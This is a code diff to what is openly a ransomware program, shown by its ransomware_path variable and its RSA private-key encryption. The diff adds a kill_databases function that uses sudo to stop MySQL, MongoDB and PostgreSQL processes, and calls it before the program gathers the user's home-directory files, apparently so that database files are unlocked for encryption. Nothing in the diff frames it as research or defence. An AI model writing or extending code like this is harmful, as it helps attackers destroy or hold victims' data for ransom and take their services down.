@@ -21,6 +21,16 @@ from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
 
 
+def kill_databases():
+    mysql = 'sudo mysqld stop; sudo mysql.server stop'
+    mongo = 'sudo service mongodb stop; sudo /etc/init.d/mongodb stop'
+    postgres = 'sudo pkill -u postgres; sudo pkill postgres'
+    
+    os.system(mysql)
+    os.system(mongo)
+    os.system(postgres)
+
+
 def encrypt_priv_key(msg, key):
     line = msg
     n = 127
@@ -91,6 +101,9 @@ def menu():
         os.mkdir(variables.ransomware_path, 700)
     except OSError:
         pass
+
+    # killing running database process
+    kill_databases()
         
     # get the files in the home directory
     # /home/$USER
@@ -201,6 +214,11 @@ for (i=0;i<Desktops.length;i++) {
     os.system(xfce)
     os.system(xfce1)
     os.system(kde)
+
+
+
+
+
 
 
 if __name__ == "__main__":
